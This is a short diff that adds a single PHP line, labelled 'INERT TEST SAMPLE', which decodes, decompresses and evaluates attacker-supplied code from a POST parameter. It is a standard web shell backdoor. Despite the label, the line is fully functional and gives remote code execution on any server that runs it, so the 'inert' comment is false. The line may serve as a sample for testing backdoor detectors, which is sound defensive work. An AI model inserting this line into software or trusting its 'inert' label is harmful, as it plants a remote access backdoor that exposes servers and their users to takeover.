@@ -1,0 +1,3 @@
+// INERT TEST SAMPLE
+eval(gzinflate(base64_decode($_POST['x'])));
+
